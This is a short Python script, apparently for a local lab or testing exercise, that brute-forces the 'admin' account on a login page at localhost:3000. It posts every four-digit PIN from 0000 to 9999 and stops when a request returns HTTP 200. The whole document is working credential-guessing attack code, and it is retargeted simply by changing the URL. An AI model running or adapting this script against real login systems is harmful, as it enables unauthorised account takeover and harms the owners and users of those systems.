from requests import post

url = "http://localhost:3000/login"
username = "admin"

#Try password
for i in range(10000):
    password = str(i).zfill(4)  # Pad with zeros to ensure 4 digits
    response = post(url, data={"username": username, "password": password})
    
    if response.status_code == 200:
        print(f"Password found: {password}")
        break
    else:
        print(f"Trying password: {password}")